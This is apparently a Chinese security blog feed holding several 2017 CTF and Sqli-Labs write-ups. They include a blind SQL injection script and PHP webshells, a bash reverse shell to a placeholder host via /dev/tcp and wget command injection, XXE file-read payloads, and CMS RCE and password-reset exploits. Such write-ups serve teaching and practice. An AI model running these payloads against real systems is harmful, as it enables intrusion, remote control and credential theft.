tucao这是脑洞题？…]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hackit2017-V1rus3pidem1c-writeup]]></title>
      <url>%2F2017%2F08%2F28%2FHackit2017-V1rus3pidem1c-writeup%2F</url>
      <content type="text"><![CDATA[Hackit2017-V1rus3pidem1c-writeupsql注入php伪协议：php://filter，zip://，phar:// Task1234567Description: Hackers created an automated site for virus attacks on the Government. You must find and catch them all!Attachment: (none)Webpage: http://tasks.ctf.com.ua:13372Hint: (none) 先看看基本的功能，你可以选择对应的国家，然后上传你的virus，但题目没有返回上传后的保存的文件路径信息。 Solutionsql注入点一下send，会发现url变为：1http://tasks.ctf.com.ua:13372/index.php?country=Germany 对于get参数，首先想的一般是sql注入；1python sqlmap.py -u http://tasks.ctf.com.ua:13372/index.php?country=Germany 接下去用下面的脚本注出数据：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091import requestsimport stringimport sysglobal findBitdef sendPayload(payload): proxy = &#123;"http":"http://127.0.0.1:8080"&#125; url = "http://tasks.ctf.com.ua:13372/index.php?country=" + payload # headers = &#123;"Content-Type": "application/x-www-form-urlencoded"&#125; content = requests.get(url,proxies=proxy) return content.textflag = "Select virus for Germany"def generateTarget(flag): if flag == "database": return "database()" elif flag == "tables": return "(SELECT%09GROUP_CONCAT(table_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.TABLES%09WHERE%09TABLE_SCHEMA=0x57484154415245594f55444f494e4748455245)" elif flag == "columns": return "(SELECT%09GROUP_CONCAT(column_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.COLUMNS%09WHERE%09TABLE_NAME=0x636f756e7472696573)" elif flag == "data": return "(SELECT%09GROUP_CONCAT(countryID,0x3a,countryName,0x3a,scriptPath%09SEPARATOR%090x3c62723e)%09FROM%09countries)"def doubleSearch(leftNum,rightNum,i,target): global findBit midNum = (leftNum + rightNum) / 2 if (rightNum != leftNum +1): payload = "' or (select ascii(substr(" +generateTarget(target) + " from "+ str(i) +" for 1))&lt;= "+str(midNum) +" )%23" # print payload recv = sendPayload(payload) # print recv if flag in recv: # print 'cuowu' # raw_input() doubleSearch(leftNum,midNum,i,target) else: # print 'chenggong' # raw_input() doubleSearch(midNum,rightNum,i,target) else: if rightNum != 0: # print rightNum # raw_input() sys.stdout.write(chr(rightNum)) sys.stdout.flush() else: findBit = 1 returndef exp(): global findBit i = 1 findBit = 0 print "The database:" target = "database" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") break i = 1 findBit = 0 print "The tables:" target = "tables" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") break i = 1 findBit = 0 print "The columns:" target = "columns" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") break i = 1 findBit = 0 print "The data:" target = "data" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") breakexp() 得到数据库WHATAREYOUDOINGHERE中countries表中的数据：1234567891011countryID:countryName:scriptPath1:Germany:country/ge.php2:Turkmenistan:country/tu.php3:Netherlands:country/ne.php4:Serbia:country/se.php5:Turkey:country/tk.php6:France:country/fr.php7:UK:country/uk.php8:Russia:country/ru.php9:USA:country/us.php10:Canada:country/ca.php 读取源码接下来看看还能做啥。初步尝试发现应该是只有1列1http://tasks.ctf.com.ua:13372/index.php?country=Germany&apos; union select 1 -- - 1http://tasks.ctf.com.ua:13372/index.php?country=Germany&apos; union select 1,2 -- - 尝试使用php伪协议：1http://tasks.ctf.com.ua:13372/index.php?country=&apos; union select &apos;php://filter/read=convert.base64-encode/resource=index.php&apos; -- - base64解码一下，其中有段code：123456789101112if (isset($_GET['country']))&#123; $link = mysqli_connect("127.0.0.1", "beeber", "eouejvnbinrwviewrJNHUFEjnkwfowe", "WHATAREYOUDOINGHERE"); $result = mysqli_query($link, "SELECT scriptPath FROM countries WHERE countryName='".$_GET['country']."';"); $res_include = $result-&gt;fetch_object()-&gt;scriptPath; //echo 'Get file: '.$res_include.'&lt;br&gt;&lt;br&gt;'; include $res_include;&#125;; include哪一个页面是根据从数据库中取出的脚本的路径决定的。根据我们前面利用脚本注出来的结果，我们看看country/ge.php中的源码：1234567&lt;?php $target_dir = "uploads/"; $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]); move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);?&gt; 从country/ge.php源码中，我们知道了文件上传后保存在uploads文件夹下，文件名也没有改变。 getflag姿势一直接上传php文件再去访问uploads下的文件是无法解析的。 可以利用zip协议或者phar协议来进行文件包含。 chybeta.php:123&lt;?php system('ls');?&gt; 打包成chybeta.zip，上传后访问：1http://tasks.ctf.com.ua:13372/index.php?country=&apos; union select &apos;zip://uploads/chybeta.zip%23chybeta.php&apos; -- - 或者访问：1http://tasks.ctf.com.ua:13372/index.php?country=&apos; union select &apos;phar://uploads/chybeta.zip/chybeta.php&apos; -- - 接下去我们利用php伪协议读取iulersiueruigfuihseruhgi.php的内容：1http://tasks.ctf.com.ua:13372/index.php?country=&apos; union select &apos;php://filter/read=convert.base64-encode/resource=iulersiueruigfuihseruhgi.php 解码后得到flag：1h4ck1t&#123;$QL&amp;LFI=FR13ND$&#125; 姿势二chybeta.php:123&lt;?php system($_GET['chybeta']);?&gt; 上传后可以直接访问：1http://tasks.ctf.com.ua:13372/index.php?chybeta=ls&amp;country=&apos; union select &apos;uploads/chybeta.php&apos; -- - 1view-source:http://tasks.ctf.com.ua:13372/index.php?chybeta=cat iulersiueruigfuihseruhgi.php&amp;country=&apos; union select &apos;uploads/chybeta.php&apos; -- -]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hackit2017-B3tterS0ci4lN3twork-writeup]]></title>
      <url>%2F2017%2F08%2F28%2FHackit2017-B3tterS0ci4lN3twork-writeup%2F</url>
      <content type="text"><![CDATA[Hackit2017-B3tterS0ci4lN3twork-writeup命令注入wget-cve利用 Task1234Description: You know what to do!Attachment: (none)Webpage: http://tasks.ctf.com.ua:13374Hint: Try to find some known cves) Hide 有一个注册Register功能，和登陆Auth功能。 在注册完成并登录后，会跳到profile.php页面： 右上角有Send Message和Get Message功能。我们试着写一条信息发送给自己： 然后到Get Message功能处，发现是存在XSS漏洞的。 但经过一番测试，这里没办法进一步的利用。回到profile.php。这里有两个功能，一个是修改密码，另一个是根据你填入的图片地址获得Your avatar。 这里我们填上一张放在自己服务器上的图片 提交后用burp看一下： 查看服务器log，发现是wget/1.15： 所以服务器端应该是用wget 我们填入图片的地址，然后保存到avatars/yourhost/xx.jpg。而且只允许jpg/png/gif。若是php文件，在被wget完成后检测后会被删除。 Solution1从上面的图片来看，假设后端的wget语句(约莫)如下：1wget -r -P avatars -A &apos;*.jpg,*.png,*.gif&apos; $url 而$url是我们可以控制的，那可以尝试注入比如换行符，比如令$URL=http://xx.com/a.jpg\nwhoami，让后端执行时变成：12wget -r -P avatars -A &apos;*.jpg,*.png,*.gif&apos; http://xx.com/a.jpgwhoami 从而导致命令注入。经过fuzz，换行符\n没有过滤，制表符\t没有过滤可用来代替空格。 我们在自己的服务器上放一个jpg文件，之所以用jpg做后缀是因为在wget完后，wget命令会检测指定后缀名，若不是，则会删掉。 其内容是：1/bin/bash -i &gt; /dev/tcp/yourhost/port 0&lt;&amp;1 2&gt;&amp;1 服务器端将使用wget将图片下载到 avatars/yourhost/xx.jpg 的位置，然后我们再利用bash去加载avatars/yourhost/xx.jpg来获得一个shell。最后的exp如下： 1234567891011import requestscookie = &#123;"PHPSESSID":"uchf0tsmo9fnpvgjllo67kr9k1"&#125;payload = "http://yourhost/chybeta.jpg\nbash\tavatars/yourhost/chybeta.jpg"url = "http://tasks.ctf.com.ua:13374/profile.php"data = &#123;"password":"","new_password":"","avatar_url":payload&#125;requests.post(url,cookies=cookie,data=data) 然后在自己的服务器上监听端口:1nc -vv -l -p 24853 运行python脚本，得到shell。 flag：1h4ck1t&#123;h4ck1t&#123;wg3t_cv3_1n_CTF&#125; Solution2wget的版本是1.15，这个在pwnhub-another-php中出现过，利用CVE-2016-70981Race condition in wget 1.17 and earlier, when used in recursive or mirroring mode to download a single file, might allow remote servers to bypass intended access list restrictions by keeping an HTTP connection open. 参考文章：Wget-Exploit-ACL-bypass-RaceCond-CVE-2016-7098 也就是说利用竞争条件，在wget的链接还没结束前，它对后缀名的检测就不会触发，这样赶在这段时间内服务器wget后的webshell其实是存在的。 但我没成功。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[HackCon2017-Steg-writeup]]></title>
      <url>%2F2017%2F08%2F27%2FHackCon2017-Steg-writeup%2F</url>
      <content type="text"><![CDATA[HackCon2017-Steg-writeup Standard Steg12I hacked my friend&apos;s facebook, by seeing his chrome password. I am smart, right?Anyways, he sent this image to one of his friends, idk what it is, looks like a useless logo, can you check? 123456789101112131415161718192021222324def asciiToBin(ascii): return ''.join(str(bin(ord(byte)))[2:].zfill(8) for byte in ascii)def hide(img, data, outName): header, trailer = 2*"11001100",2*"0101010100000000" dataBin = header+asciiToBin(data)+trailer pixels, mode = list(img.getdata()), img.mode newPixels = [] for i in range(len(dataBin)): newPixel = list(pixels[i]) newPixel[i%len(mode)] = setLSB(newPixel[i%len(mode)], dataBin[i]) newPixels.append(tuple(newPixel)) newData = newPixels + pixels[len(newPixels):] img.putdata(newData) img.save(outName, "PNG")def setLSB(target, value): binary = str(bin(target))[2:] if binary[-1] != value: binary = binary[:-1] + value return int(binary, 2)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[HackCon2017-Web-writeup]]></title>
      <url>%2F2017%2F08%2F27%2FHackCon2017-Web-writeup%2F</url>
      <content type="text"><![CDATA[HackCon2017-Web-writeup Noobcoder12345A junior recently started doing PHP, and makes some random shit. He uses gedit as his go-to editor with a black theme thinking it was sublime.So he made this login portal, I am sure he must have left something out. Why don&apos;t you give it a try?Server: http://defcon.org.in:6062Note: dirbuster is NOT required for this question 存在文件checker.php~，下载下来后打开：123456&lt;?phpif ($_POST["username"] == $_POST["password"] &amp;&amp; $_POST["password"] !== $_POST["username"]) echo "congratulations the flag is d4rk&#123;TODO&#125;c0de";else echo "nice try, but try again";?&gt; 存在弱类型比较问题，payload：1username=0e1&amp;password=0e2 得到flag：1d4rk&#123;l0l_g3dit_m4ster_roxx&#125;c0de Magic12345Everything disappears magically.Can you magically prevent that?http://defcon.org.in:6060/index.phpNote: dirbuster is NOT required for this question 有一个登陆框，但初尝后没有发现注入。 抓包看看，有一些奇怪的set-cookie： 将所有的setcookie保存到cookie.txt中，用脚本将其中的字符提取出来：1234567891011121314import osimport refrom urllib import unquotecontent = open("cookie.txt","rb").read()reg = r'=(.+?); expires='cookiere = re.compile(reg)cookielist = re.findall(cookiere,content)result = ""for i in cookielist: result += unquote(i)print result 运行后得到：1++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++.--.--------------.+++++++++++++.----.-------------.++++++++++++.--------.&lt;------------.&lt;++.&gt;&gt;----.+.&lt;+++++++++++.+++++++++++++.&gt;+++++++++++++++++.---------------.++++.+++++++++++++++.&lt;&lt;.&gt;&gt;-------.&lt;+++++++++++++++.&gt;+++..++++.--------.+++.&lt;+++.&lt;++++++++++++++++++++++++++.&lt;++++++++++++++++++++++.&gt;++++++++++++++..&gt;+.----.&gt;------.+++++++.--------.&lt;+++.&gt;++++++++++++..-------.++. 用brainfuck编译器解释后：12λ .\brainfuck.exeusername: abERsdhw password: HHealskdwwpr 得到用户名和密码，登陆，得到flag：1d4rk&#123;c00k13s_4r3_fun&#125;c0de Dictator123456A dictator is creating a lot of fuss nowadays by claiming to have nuclear weapons. I somehow got access to his personal website that he uses to send instructions, but I cannot get in. Can you try?Link: Website(http://defcon.org.in:6063/)Hint: you need to be living in that country to get access.Hint2: north korea 直接访问会提示Access denied，修改Accept-Language也没用。 修改X-Forwarded-For为north korea的ip。修改User-Agent为north korea的浏览器NaenaraBrowser。 Stolen Calculator - PWN123I stole this calculator from someone and made some changes because I am the plagiarism god. Bow before me now.btw wanna try it: http://defcon.org.in:9080/Hint: This is a pwn challenge]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XNUCA2017-第一期：Web-writeup]]></title>
      <url>%2F2017%2F08%2F26%2FXNUCA2017-%E7%AC%AC%E4%B8%80%E6%9C%9F%EF%BC%9AWeb-writeup%2F</url>
      <content type="text"><![CDATA[XNUCA2017-第一期：Web-writeup 难度中等偏下 题目类型：CTF题，渗透/模板题 No.1 你喜欢颜文字么123456关键字词：一档CTF题===============================================================Lloowweerrxx是个喜欢用代码仓库的好孩子f3e6cc87187fe797bf8c89e7688c1039.xnuca.cn 看到代码仓库，想到github，访问：1https://github.com/lloowweerrxx/ 发现有12345678910111213$safeanswer = $_POST['safeanswer'];$safequestion = $_POST['safequestion'];$turequestion = intval(0);$tureanswer = intval(0);if(empty($safequestion))&#123; die("安全问题不能为空！");&#125;if(empty($safeanswer))&#123; die("安全问题答案不能为空！");&#125;if($tureanswer == $safeanswer &amp;&amp; $turequestion == $safequestion)&#123; echo $flag;&#125; 得到flag：1xnuca&#123;921e440934d87e45f37e3ec2081f9735&#125; No.2 让你无语的md5123456关键字词：一档CTF题===============================================================Pav1遇到不会的md5很喜欢去百度一下无语的md5e5a5dc7404c4e4dad32e4556ac2588b6.xnuca.cn 查看源代码：12&lt;!--pav1和lloowweerrxx经常因为用同一个账号而吵起来--&gt;&lt;!--pav1建数据库喜欢用默认的latin1，lloowweerrxx写程序的时候set了一下utf8,他们好像又吵起来啦--&gt; 输入：admin(即admin后面有好多空格)，得到： 然后去 https://somd5.com/ 查询，得到：1xnuca&#123;0c7b5781935082833f6487a69d81404b&#125; No.3 Pav1和lloowweerr…123456关键字词：二档CTF题===============================================================听说pav1不小心放了一个flag文件在/home/user下，而且忘了加扩展名9f264492ec95b853dec810609f875c3b.xnuca.cn 很明显，ffmpeg任意文件读取漏洞，参考1http://www.freebuf.com/column/142775.html 运行：1python3 gen_xbin_avi.py file:///home/user/flag chybeta.avi 然后上传到网站上，最后下载下来 观看 1xnuca&#123;7bed46c5c61c0ac625cebf8a9922cc48&#125; No.4 X-NUCA 2017’s S…123456关键字词：二档CTF题===============================================================X-NUCA 2017’s Secretsa4b359466421ae3aa76a8b116dda3870.xnuca.cn 这个没做出来。 No.5 Lucky Number Ca…123456关键字词：一档CTF题===============================================================Lucky Number Calcf83f119af64fa2b94c37231bbce09678.xnuca.cn 填入后，抓包12345678910111213POST /ctf1.php HTTP/1.1Host: f83f119af64fa2b94c37231bbce09678.xnuca.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://f83f119af64fa2b94c37231bbce09678.xnuca.cn/Content-Length: 30Connection: close&lt;user&gt;&lt;name&gt;aaaa&lt;/name&gt;&lt;/user&gt; xml的形式，就觉得是xxe漏洞，不过早上弄得时候没弄出来。下午lzhtony给了一个能读取文件的payload，但没发现flag在哪。 然后就开始找咯，对照自己的linux的目录一个一个翻，最后12345678910111213141516POST /ctf1.php HTTP/1.1Host: f83f119af64fa2b94c37231bbce09678.xnuca.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://f83f119af64fa2b94c37231bbce09678.xnuca.cn/Content-Length: 134Connection: close&lt;!DOCTYPE ANY [&lt;!ENTITY x SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/hosts&quot;&gt;]&gt;&lt;user&gt;&lt;name&gt;&amp;x;&lt;/name&gt;&lt;/user&gt; 解码得：1234567127.0.0.1 localhost127.0.0.1 xnuca&#123;N3sSMD165KesSXlyOgwMGTepI2HTJC0b&#125;.xip.io# The following lines are desirable for IPv6 capable hosts::1 localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allrouters flag：1xnuca&#123;N3sSMD165KesSXlyOgwMGTepI2HTJC0b&#125; 看这个flag的位置和hosts的配置，感觉是要利用xxe来探测内网来获得flag的。 No.6 Hello World1234567关键字词：二档CTF题===============================================================即使是Hello world也要好好管理代码！91101217df5a534c58f8b0e0922e1161.xnuca.cn 说要管理代码，git泄露。1perl rip-git.pl http://91101217df5a534c58f8b0e0922e1161.xnuca.cn/.git 没做出来。 No.8 看视频真嗨皮12695c354c811a33d792d9e0efb2305cfb.xnuca.cn请在目标入口/writeHere/目录下创建名为00111e86d51fa2b62add879572a0d29e的文件 海洋cms，见了好多次了。创建文件的payload如下：1234http://695c354c811a33d792d9e0efb2305cfb.xnuca.cn/writeHere/00111e86d51fa2b62add879572a0d29ePOST:searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=file_put_contents(&quot;writeHere/00111e86d51fa2b62add879572a0d29e&quot;,&quot;&lt;?php phpinfo(); ?&gt;&quot;); 查找flag的payload如下：1234view-source:http://695c354c811a33d792d9e0efb2305cfb.xnuca.cn/search.php?searchtype=5POST:searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=system(&quot;find / | grep flag&quot;); 读取flag的payload如下：1234view-source:http://695c354c811a33d792d9e0efb2305cfb.xnuca.cn/search.php?searchtype=5POST:searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=system(&quot;cat /etc/flag.txt&quot;); 得到flag：1xnuca&#123;36d1ecfbe0fc9b79054ff70bb204af25&#125; No.9 The Best Commun…196433e53a974329f13590be3e215aebd.xnuca.cn 查到：1https://www.exploit-db.com/exploits/40756/ 利用里面的exp进行获取flag：1234567890x4148@96433e53a974329f13590be3e215aebd.xnuca.cn# cat /etc/flag.txtxnuca&#123;123e5ebb3f34a07990e477e85eb60170&#125;0x4148@96433e53a974329f13590be3e215aebd.xnuca.cn# echo &quot;a&quot; &gt; ../writeHere/00111e86d51fa2b62add879572a0d29e0x4148@96433e53a974329f13590be3e215aebd.xnuca.cn# ls ../writeHere/00111e86d51fa2b62add879572a0d29e No.11 两只小蜜蜂啊123adee757b88f7716820dc6d9bec43684d.xnuca.cn请在目标入口/writeHere/目录下创建名为00111e86d51fa2b62add879572a0d29e的文件 查到：1https://bbs.ichunqiu.com/thread-13977-1-1.html 利用文章里的exp，成功获取到shell。然后就拿到flag了。不过忘记截图了。 No.12 社工库12345关键字词：二档靶标题===============================================================社工之余吃个芒果休息一下吧！ 没做出来。 No.18 “开讲啦”查到：1https://www.exploit-db.com/exploits/24869/ 访问:1234http://8d52640a73d8073066c951df0501184a.xnuca.cn/oauth/lti/common/tool_provider_outcome.phpPOST:grade=1&amp;key=1&amp;secret=secret&amp;sourcedid=1&amp;submit=Send%20Grade&amp;url=/etc/flag.txt 得到flag：1xnuca&#123;Co8n0g5r72a4tul3at2ions!Y0ug0tMe&#125; 但是因为只找到任意文件读取漏洞，所以只能做读取flag的操作。写的操作没有成功。 No.23 找入口1http://www.websecgeeks.com/2015/08/wolf-cms-arbitrary-file-upload-to.html 弱密码：admin：admin 登陆后直接上传k.php，内容为：1&lt;?php eval($_GET['AAA']) ?&gt; 访问，写入文件1http://cef033ea85498682c1c33309def1a109.xnuca.cn/public/k.php?AAA=file_put_contents(&quot;writeHere/00111e86d51fa2b62add879572a0d29e&quot;,&quot;&lt;?php phpinfo(); ?&gt;&quot;); 访问，读取flag。1http://cef033ea85498682c1c33309def1a109.xnuca.cn/public/k.php?AAA=system(&quot;cat /etc/flag.txt&quot;); flag：1xnuca&#123;24567gtfvretyasdsgrtyjyufdgrth23&#125; No.24 可爱的星星12337af3efae1d906343d29b6b1a96fcd54.xnuca.cn请在目标入口/writeHere/目录下创建名为00111e86d51fa2b62add879572a0d29e的文件 没做出来。 No.25 愉快的玩耍吧重置Admin密码为1234567： 1/admin/login/login_check.php?met_cookie_filter[a]=a%27,admin_pass=md5(1234567)+where+id=1;+%23-- 登录，并上传一个压缩了一句话php文件的压缩包到以下地址，会自动解压 1/admin/include/uploadify.php?type=skin&amp;wate=undefined&amp;module=undefined&amp;lang=cn 插入一句话的代码是 1&lt;?php $e = $_REQUEST['e']; $arr = array($_REQUEST['pass'],); array_filter($arr, base64_decode($e)); ?&gt; 用以下地址得到shell： 1/templates/test.php?e=YXNzZXJ0 然后读取/etc/flag.txt，并写入文件即可。 小结吐槽点： 比赛服务器：） 扫一扫就被办：） 重点是找poc/exp…..]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[流量包提取文件方法]]></title>
      <url>%2F2017%2F08%2F25%2F%E6%B5%81%E9%87%8F%E5%8C%85%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95%2F</url>
      <content type="text"><![CDATA[流量包提取文件方法 wiresharkwrieshark自带有文件分离功能。 tcpxtract通过下面命令安装：1apt-get install tcpxtract 使用方法：1tcpxtract -f XXX.pcap 以hitctf2017的Cephalopod为例123root@chybeta:~/Desktop/hitb2017/misc/Cephalopod# tcpxtract -f 2a9c1cdd-2ac0-4b2a-828d-269c6e04ebbb.pcapFound file of type &quot;png&quot; in session [10.0.2.7:49818 -&gt; 10.0.2.10:36890], exporting to 00000000.pngFound file of type &quot;png&quot; in session [10.0.2.7:49818 -&gt; 10.0.2.10:36890], exporting to 00000001.png 即可得到藏在流量包里的文件： foremostforemost是基于文件头及尾部信息恢复文件的工具。 使用方法：1foremost -i XXX.pcap 以hitbctf2017的simple_transfer为例 12345678root@chybeta:~/Desktop/hitb2017/misc/simple_transfer# foremost -i b48bfaf7-d728-4ae3-94b7-cd8b2e6e9077.pcapProcessing: b48bfaf7-d728-4ae3-94b7-cd8b2e6e9077.pcap|*|root@chybeta:~/Desktop/hitb2017/misc/simple_transfer# lsb48bfaf7-d728-4ae3-94b7-cd8b2e6e9077.pcap outputroot@chybeta:~/Desktop/hitb2017/misc/simple_transfer# cd output/root@chybeta:~/Desktop/hitb2017/misc/simple_transfer/output# lsaudit.txt pdf 即可恢复出藏在流量包里的文件。 Network miner下载地址：https://sourceforge.net/projects/networkminer/ 还有一些方法，遇到后再慢慢补充。 Refference CTF取证类题目指南 返璞归真——流量中提取文件的五种方法 Four ways to extract files from pcaps awesome-pcaptools]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[HITB CTF 2017-Dating in Singapore-writeup]]></title>
      <url>%2F2017%2F08%2F24%2FHITB-CTF-2017-Dating-in-Singapore-writeup%2F</url>
      <content type="text"><![CDATA[HITB CTF 2017-Dating in Singapore-writeup Task101081522291516170310172431-050607132027162728-0102030209162330-02091623020310090910172423-02010814222930-0605041118252627-0203040310172431-0102030108152229151617-04050604111825181920-0108152229303124171003-261912052028211407-04051213192625 Solution根据分隔符-分开每行，并且两两数字一组：123456789101112131415161718192021222301 08 15 22 29 15 16 17 03 10 17 24 3105 06 07 13 20 27 16 27 2801 02 03 02 09 16 23 3002 09 16 23 02 03 10 09 09 10 17 24 2302 01 08 14 22 29 3006 05 04 11 18 25 26 2702 03 04 03 10 17 24 3101 02 03 01 08 15 22 29 15 16 1704 05 06 04 11 18 25 18 19 2001 08 15 22 29 30 31 24 17 10 0326 19 12 05 20 28 21 14 0704 05 12 13 19 26 25 数字的特征，最小为01，最大为31，一共十二行，恰对应12个月，每个月最多31天。结合今年（2017）日历 第一行：101 08 15 22 29 15 16 17 03 10 17 24 31 对照一月份，“写出”得到字母：H。 其余类似。 最后的flag：1HITB&#123;CTFFUN&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sqli-Labs:Less17-writeup]]></title>
      <url>%2F2017%2F08%2F23%2FSqli-Labs-Less17-writeup%2F</url>
      <content type="text"><![CDATA[Sqli-Labs是用来练习sql注入的好平台。project地址：https://github.com/Audi-1/sqli-labs本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53 Less-17 POST-Update Query-Error Based-String 基础知识三种基本语句。 INSERT123INSERT INTO table_name ( field1, field2,...fieldN ) VALUES ( value1, value2,...valueN ); 示例：123456789101112mysql&gt; desc users;+----------+-------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+----------------+| id | int(3) | NO | PRI | NULL | auto_increment || username | varchar(20) | NO | | NULL | || password | varchar(20) | NO | | NULL | |+----------+-------------+------+-----+---------+----------------+3 rows in set (0.06 sec)mysql&gt; insert into users(id,username,password) value(0,&quot;chybeta&quot;,&quot;chybeta&quot;);Query OK, 1 row affected (0.09 sec) UPDATE12UPDATE table_name SET field1=new-value1, field2=new-value2[WHERE Clause] 示例12345678910111213141516171819202122232425262728293031mysql&gt; select id,username,password from users where id=15; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 15 | chybeta | chybeta | +----+----------+----------+ 1 row in set (0.00 sec) mysql&gt; update users set username=&quot;atebyhc&quot; where id=15; Query OK, 1 row affected (0.08 sec) Rows matched: 1 Changed: 1 Warnings: 0 mysql&gt; select id,username,password from users where id=15; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 15 | atebyhc | chybeta | +----+----------+----------+ 1 row in set (0.00 sec) mysql&gt; update users set username=&quot;chybeta&quot;,password=&quot;atebyhc&quot; where id=15; Query OK, 1 row affected (0.00 sec) Rows matched: 1 Changed: 1 Warnings: 0 mysql&gt; select id,username,password from users where id=15; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 15 | chybeta | atebyhc | +----+----------+----------+ 1 row in set (0.00 sec) DELETE1DROP TABLE table_name ; 这个。。暂时先不演示了。。 Less 17这题的题目为：[PASSWORD RESET] 。可以推测后端的语句为UPDATE型，约莫如下：1update users set password=新密码 where username=账号； 我们post数据为：1uname=admin&amp;passwd=chybeta&apos;&amp;submit=Submit 则发现有报错回显：1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;admin&apos;&apos; at line 1 为单引号，所以可以推测语句为：1update users set password=&apos;$password&apos; where username=&apos;$username&apos;； 接下去进行报错注入。 updatexml()1UPDATEXML (XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。第三个参数：new_value，String格式，替换查找到的符合条件的数据作用：改变文档中符合条件的节点的值(以上来自学习笔记 UpdateXml() MYSQL显错注入) payload:1uname=admin&amp;passwd=chybeta&apos; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#&amp;submit=Submit 可以获取数据库名为：security。 但要获取数据：1uname=admin&amp;passwd=chybeta&apos; and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM users limit 0,1),0x7e),1)#&amp;submit=Submit 却会显示：1You can&apos;t specify target table &apos;users&apos; for update in FROM clause 也就是说不能用update获取当前表的数据，因为update的子查询中不能出现相同的表名。 这个可以先新建一张表，然后再在这个新建的临时表中进行查询：1uname=admin&amp;passwd=chybeta&apos; and updatexml(1,concat(0x7e,(SELECT group_concat(0x23,username,0x3a,password,0x23) FROM (select * from users)tmp),0x7e),1)#&amp;submit=Submit 这在sql.log中的语句为：1UPDATE users SET password = &apos;chybeta&apos; and updatexml(1,concat(0x7e,(SELECT group_concat(0x23,username,0x3a,password,0x23) FROM (select * from users)tmp),0x7e),1)#&apos; WHERE username=&apos;admin&apos; 其中(select * from users)tmp新建了一张tmp表，外面的SELECT...FROM..是从tmp中获取数据。 updatexml有长度限制,最长32位 extractvalue()payload:1uname=admin&amp;passwd=chybeta&apos; and extractvalue(1,concat(0x7e,database()))#&amp;submit=Submit 得到数据库名称为 security 查字段：1uname=admin&amp;passwd=chybeta&apos; and extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns where table_name = &quot;users&quot;)))#&amp;submit=Submit 获取账号密码：1uname=admin&amp;passwd=chybeta&apos; and extractvalue(1,concat(0x7e,(SELECT group_concat(0x23,username,0x23,password) FROM (select * from users)tmp)))#&amp;submit=Submit 对应的后端查询语句为：1UPDATE users SET password = &apos;chybeta&apos; and extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns where table_name = &quot;users&quot;)))#&apos; WHERE username=&apos;admin&apos; extractvalue也有长度限制,最长32位 Refference 利用insert，update和delete注入获取数据]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sqli-Labs:Less15~16-writeup]]></title>
      <url>%2F2017%2F08%2F23%2FSqli-Labs-Less15-16-writeup%2F</url>
